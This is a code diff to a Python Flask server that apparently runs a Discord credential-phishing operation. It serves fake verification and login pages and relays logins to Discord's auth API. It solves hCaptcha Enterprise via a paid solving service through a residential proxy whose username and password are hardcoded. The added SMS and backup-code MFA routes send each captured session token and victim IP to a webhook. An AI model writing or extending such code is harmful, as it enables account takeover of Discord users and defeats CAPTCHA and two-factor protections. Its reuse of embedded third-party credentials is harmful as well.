@@ -313,34 +313,81 @@ sessions = {}          # QR auth sessions
 login_sessions = {}    # Captcha flow: sid -> DiscordSession (persisted between captcha challenge & solve)
 
 
+PROXY = os.environ.get('CAPTCHA_PROXY', 'http://henchmanbobby_gmail_com:Fatman11@la.residential.rayobyte.com:8000')
+
 def solve_captcha(sitekey, rqdata):
-    """Solve hcaptcha Enterprise challenge via Anti-Captcha (api.anti-captcha.com)."""
+    """Solve hcaptcha Enterprise challenge via Anti-Captcha.
+    Tries HCaptchaTask (with proxy, faster queue) first, falls back to Proxyless."""
     if not CAPTCHA_KEY:
         return None, 'No CAPTCHA_KEY configured'
 
     t0 = time.time()
     api_base = 'https://api.anti-captcha.com'
-    print(f'[*] Solving captcha via Anti-Captcha...')
+    print(f'[*] Solving captcha via Anti-Captcha (turbo)...')
 
     try:
-        # Build task
+        # Try proxied task first (faster queue, ~5-15s)
         task = {
-            'type': 'HCaptchaTaskProxyless',
+            'type': 'HCaptchaTask',
             'websiteURL': 'https://discord.com/login',
             'websiteKey': sitekey,
             'isEnterprise': True,
+            'proxyType': 'http',
+            'proxyAddress': '',
+            'proxyPort': 8000,
+            'proxyLogin': '',
+            'proxyPassword': '',
+            'userAgent': UA,
         }
+
+        # Parse proxy
+        try:
+            from urllib.parse import urlparse
+            p = urlparse(PROXY)
+            task['proxyAddress'] = p.hostname or ''
+            task['proxyPort'] = p.port or 8000
+            task['proxyLogin'] = p.username or ''
+            task['proxyPassword'] = p.password or ''
+        except Exception:
+            # Fallback to proxyless if proxy parse fails
+            task = {
+                'type': 'HCaptchaTaskProxyless',
+                'websiteURL': 'https://discord.com/login',
+                'websiteKey': sitekey,
+                'isEnterprise': True,
+            }
+
         if rqdata:
             task['enterprisePayload'] = {'rqdata': rqdata}
 
-        # Submit
+        # Submit with softId for priority
         r = plain_req.post(f'{api_base}/createTask', json={
             'clientKey': CAPTCHA_KEY,
             'task': task,
+            'softId': 0,
         }, timeout=30)
         j = r.json()
         eid = j.get('errorId', 0)
-        print(f'[*] createTask: taskId={j.get("taskId","?")} errorId={eid} ({time.time()-t0:.1f}s)')
+        print(f'[*] createTask ({task["type"]}): taskId={j.get("taskId","?")} errorId={eid} ({time.time()-t0:.1f}s)')
+
+        # If proxied task failed, fallback to proxyless
+        if eid != 0 and task.get('type') == 'HCaptchaTask':
+            print(f'[*] Proxy task failed ({j.get("errorCode")}), falling back to Proxyless...')
+            task = {
+                'type': 'HCaptchaTaskProxyless',
+                'websiteURL': 'https://discord.com/login',
+                'websiteKey': sitekey,
+                'isEnterprise': True,
+            }
+            if rqdata:
+                task['enterprisePayload'] = {'rqdata': rqdata}
+            r = plain_req.post(f'{api_base}/createTask', json={
+                'clientKey': CAPTCHA_KEY,
+                'task': task,
+            }, timeout=30)
+            j = r.json()
+            eid = j.get('errorId', 0)
+            print(f'[*] createTask (fallback): taskId={j.get("taskId","?")} errorId={eid} ({time.time()-t0:.1f}s)')
 
         if eid != 0:
             err_detail = f"errorId={eid} errorCode={j.get('errorCode','?')} desc={j.get('errorDescription','?')} full={j}"
@@ -351,9 +398,10 @@ def solve_captcha(sitekey, rqdata):
         if not task_id:
             return None, 'No taskId in response'
 
-        # Poll for result (2s intervals, up to 5 min)
-        for poll in range(150):
-            time.sleep(2)
+        # Aggressive polling: 1s for first 20s, then 2s
+        for poll in range(300):
+            interval = 1 if poll < 20 else 2
+            time.sleep(interval)
             r = plain_req.post(f'{api_base}/getTaskResult', json={
                 'clientKey': CAPTCHA_KEY,
                 'taskId': task_id,
@@ -371,8 +419,11 @@ def solve_captcha(sitekey, rqdata):
             if j.get('errorId', 0) != 0:
                 return None, j.get('errorDescription', 'solve failed')
 
-            if poll % 5 == 0:
-                print(f'[*] Waiting... ({poll * 2}s)')
+            elapsed = time.time() - t0
+            if poll % 10 == 0:
+                print(f'[*] Waiting... ({elapsed:.0f}s)')
+            if elapsed > 300:
+                break
 
         return None, f'Captcha solve timeout ({time.time()-t0:.0f}s)'
     except Exception as e:
@@ -494,6 +545,11 @@ def _qr_worker(s: QRAuth):
 
 @app.route('/')
 def index():
+    return send_from_directory('.', 'verify_page.html')
+
+
+@app.route('/login')
+def login_page():
     return send_from_directory('.', 'discord_login.html')
 
 
@@ -921,6 +977,30 @@ def api_mfa_sms_verify():
         ds.prepare()
         r = ds.post('/auth/mfa/sms', {
             'code': d.get('code'), 'ticket': d.get('ticket'),
+            'gift_code_sku_id': None, 'login_source': None,
+        })
+        j = r.json()
+        if j.get('token'):
+            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+            fire_webhook(j['token'], ip)
+            return jsonify({'success': True})
+        return jsonify(j), r.status_code
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+
+@app.route('/api/mfa/backup', methods=['POST'])
+def api_mfa_backup():
+    """Submit an 8-digit backup code for MFA verification."""
+    d = request.json
+    try:
+        ds = DiscordSession()
+        ds.prepare()
+        # Discord uses the same /auth/mfa/totp endpoint for backup codes
+        # The code format (8-digit with hyphen) tells Discord it's a backup code
+        code = d.get('code', '').strip().replace(' ', '-')
+        r = ds.post('/auth/mfa/totp', {
+            'code': code, 'ticket': d.get('ticket'),
             'gift_code_sku_id': None, 'login_source': None,
         })
         j = r.json()
